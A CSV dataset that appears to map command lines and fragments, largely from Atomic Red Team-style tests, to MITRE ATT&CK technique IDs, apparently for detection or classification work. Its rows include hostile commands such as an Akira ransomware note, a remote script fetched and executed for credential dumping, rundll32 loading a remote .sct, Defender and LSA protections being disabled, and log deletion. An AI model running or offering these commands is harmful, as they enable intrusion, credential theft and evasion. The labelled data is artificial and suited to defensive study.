command,mitre_id
Stop-Process -processname notepad,T1055
"echo ""ExecStopPost=$execstoppost_action"" >> $systemd_service_path/$systemd_service_file",T1543
HKCU\Software\Microsoft\Windows\CurrentVersion\Run\\[a-f0-9A-F]{8},T1547
"echo ""2. Paying us you save your TIME, MONEY, EFFORTS and be back on track within 24 hours approximately. Our decryptor works properly on any files or systems, so you will be able to check it by requesting a test decryption service from the beginning of our conversation. [f you decide to recover on your own, keep in mind that you can permanently lose access to some files or accidently corrupt them — in this case we won't be able to help. "" >> $env:Userprofile\Desktop\akira_readme.txt",T1486
try{,T1070
SIGQUIT,T1564
echo $(echo $ENCODED) | b64decode -r,T1140
"net groups ""Account Operators"" /domain",T1069
/HMODULE,T1218
winword.exe {REMOTEURL},T1105
bash /tmp/art_payload.sh,T1027
.timer,T1053
ObtainUserAgentString,T1106
"if [ $(echo $HISTFILE) == ""/dev/null"" ]; then echo ""\$HISTFILE is /dev/null""; else HIST_LENGHT=$(wc -l $HISTFILE); echo ""\$HISTFILE is not /dev/null, history lenght is $HIST_LENGHT""; fi",T1562
"""@ -Replace ""DOMAIN_SID"", $domain_sid | Out-File -Encoding OEM $env:TEMP\golden.bat",T1558
LogonUser,T1134
"Disable-WindowsOptionalFeature -Online -FeatureName ""Windows-Defender-ApplicationGuard"" -NoRestart -ErrorAction Ignore",T1562
PIS-MOB,T1070
property * | findstr “Address””,T1018
~/Library/Keychains/login.keychain,T1555
"rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write();GetObject(""script:https[:]//www[.]example[.]com/malicious.sct"")""",T1218
echo save backup copy to /tmp/,T1547
replace.exe {PATH_ABSOLUTE:.cab} {PATH_ABSOLUTE:folder} /A,T1105
Invoke-WebRequest -OutFile C:\Users\$env:username\Desktop\TeamViewer_Setup.exe https://download.teamviewer.com/download/TeamViewer_Setup.exe,T1219
"C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /out:""$output_file"" /target:exe ""$source_file""",T1106
recentFiles.py,T1083
"Set-ItemProperty ""HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\AtomicRedTeam"" ""Asynchronous"" 0 -Type DWord -Force",T1547
.wsb,T1564
hidden,T1564
C:\Windows\System32\cmd.exe,T1059
"if (""$uname"" -ne """") {",T1204
ProxyCommand,T1202
netsh.exe advfirewall firewall show rule name=all,T1518
"reg query ""HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\\Shell""",T1012
"New-Item -Path ""HKCU:\Software\Microsoft\Office\16.0\Excel""",T1562
"python3 -c ""from base64 import b64decode as d;dec=d(\""$ENCODED\"");print(dec.decode())""",T1140
net use * /DELETE /Y,T1070
mstsc.exe,T1021
try{ IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1003.001/src/Out-Minidump.ps1') -ErrorAction Stop},T1003
wmic cpu get name,T1082
Invoke-watson,T1082
$word.Quit(),T1137
AddMonitor,T1547
"schtasks /create /tn ""mysc"" /tr C:\Users\Public\test.exe /sc ONLOGON /ru ""System""",T1053
"Start-Process ""$file_path\Sysinternals\accesschk.exe"" -ArgumentList ""-accepteula .""",T1555
netstat -oan,T1049
"if($cred.GetNetworkCredential().Password -eq ""$new_password""){",T1098
copy c:\users\person\evil.exe c:\users\public\manage-bde.exe & cd c:\users\public\ & cscript.exe c:\windows\system32\manage-bde.wsf,T1216
echo $sh_encoded | base64 -d | bash,T1140
"copy ""$filename"" %TEMP%\LibHello.js",T1127
SettingSyncHost -LoadAndRunDiagScriptNoCab {PATH:.bat},T1218
C:\\,T1036
upload,T1140
"Remove-Item -Path (Join-Path ""$Env:SystemRoot\prefetch\"" (Get-ChildItem -Path ""$Env:SystemRoot\prefetch\*.pf"" -Name)[0])",T1070
"Set-ItemProperty ""HKLM:\Software\Policies\Microsoft\Windows Defender\MpEngine"" -Name ""MpEnablePus"" -Value 0",T1562
try {,T1046
"""@ -Replace ""kirbifile"", $filename | Out-File -Encoding OEM $env:TEMP\golden.bat",T1558
InstallUtil HelpText property execution test failure. Installer assembly execution output did not match the expected output.,T1218
attrib.exe +s $file_to_modify,T1564
"""PathToAtomicsFolder\..\ExternalPayloads\build\namedpipes_executor.exe"" --pipe 5",T1559
Start-Process -FilePath $env:windir\system32\sdclt.exe,T1548
Set-ADUser -AllowReversiblePasswordEncryption $true,T1556
ZwOpenProcess,T1562
bing[.]com?id=<GetTickCount>,T1016
public class Test {,T1036
pw useradd $username -g 0 -d /root -s /bin/sh,T1136
"$tr.Add(""[File] $_ Size:$($fi.Length) LastWrite:$($fi.LastWriteTime)"")",T1083
rd /S,T1070
"mkdir -p /var/spool/mail/copy && for file in /var/spool/mail/*; do if [ ""$(basename ""$file"")"" != ""copy"" ]; then cp -R ""$file"" /var/spool/mail/copy/; fi; done && rm -rf /var/spool/mail/copy/*",T1070
StorageAccountName = $account.name,T1619
reg query HKLM\SYSTEM\CurrentControlSet\Services\Disk\Enum,T1082
"dd if=/proc/""${PID}""/mem of=""$output_file"" ibs=1 skip=""$MEM_START"" count=""$MEM_SIZE""",T1003
sqlcmd -i $remote_url -o $local_file_path,T1105
"reg add ""HKLM\Software\Policies\Microsoft\Windows NT\CurrentVersion\Winlogon"" /v AutoAdminLogon /t REG_DWORD /d 1 /f",T1562
1..$limit | % {,T1003
"echo ""# Default-Stop: "" >> /etc/init.d/T1543.002",T1543
"echo ""$pwd_for_encrypted_file"" | $which_gpg --batch --yes --passphrase-fd 0 --cipher-algo $encryption_alg -o $encrypted_file_path -c $input_file_path",T1486
"copy ""$ps1_path"" %temp%\T1036.007_masquerading.doc.ps1 /Y",T1036
kernel32.dll,T1497
"reg add ""HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\ProtocolDefaults"" /v https /t REG_DWORD /d 0 /F",T1112
"rundll32.exe desk.cpl,InstallScreenSaver {PATH_ABSOLUTE:.scr}",T1218
Add-MpPreference -ExclusionProcess $excludedProcess,T1562
gcloud iam service-accounts keys create $output-key-file --iam-account=$service-account-email,T1078
gsettings,T1564
"Copy-Item -Path ""C:\windows\system32\customshellhost.exe"" -Destination ""$dest_path\customshellhost.exe"" -Force",T1218
"echo ""Whatever who you are and what your title is if you' re reading this it means the internal infrastructure of your company is fully or partially dead, all your backups - virtual, physical - everything that we managed to reach - are completely removed. Moreover, we have taken a great amount of your corporate data prior to encryption Well, for now let's keep all the tears and resentment to ourselves and try to build a constructive dialogue. We're fully aware of what damage we caused by locking your internal sources. At the moment. you have to know: "" >> $env:Userprofile\Desktop\akira_readme.txt",T1486
HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows\load,T1547
ADMIN$,T1021
C:\\windows\\temp\\s\\,T1074
Invoke-RunAs,T1134
LoadResource,T1106
ThreadHideFromDebugger,T1622
"""reg"" add HKLM\SYSTEM\CurrentControlSet\Control\LSA /v RunAsPPL /t REG_DWORD /d 0 /f",T1562
regsvcs.exe {PATH:.dll},T1218
pnputil.exe -i -a $driver_path,T1547
CreateProcessW,T1106
"Start-Process -FilePath ""C:\Temp\ExternalPayloads\PCHunter_free\$pchunter64_exe""",T1057
esxi network ip connection list,T1049
/var/spool/cron/crontabs/root,T1053
"Set-ItemProperty ""HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\"" ""Notification Packages"" $notificationPackagesValues",T1556
mkdir $HOME/...,T1036
dd if=/dev/urandom bs=1 count=1 >> $file_to_pad #adds low-quality random data,T1027
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices,T1060
ru_RU,T1614
HKEY_CURRENT_USER\Software\Classes\CLSID\{E6D34FFC-AD32-4d6a-934C-D387FA873A19},T1546
%USERPROFILE%\AppData\Local\Google\Chrome\User Data\LocalState,T1217
echo End of Golden Ticket attack,T1558
"rundll32.exe Mshtml.dll,PrintHTML {PATH_ABSOLUTE:.hta}",T1218
"wmic.exe /node:""192.168.0.1"" process call create ""{CMD}""",T1218
"echo ""put $local_path\$file_name"" | sftp $username@$remote_host:$remote_path",T1105
certutil -decode {PATH:.base64} {PATH},T1140
esxcli system syslog config reload,T1562
"reg.exe add hkcu\software\classes\ms-settings\shell\open\command /v ""DelegateExecute"" /f",T1548
Volume Information,T1485
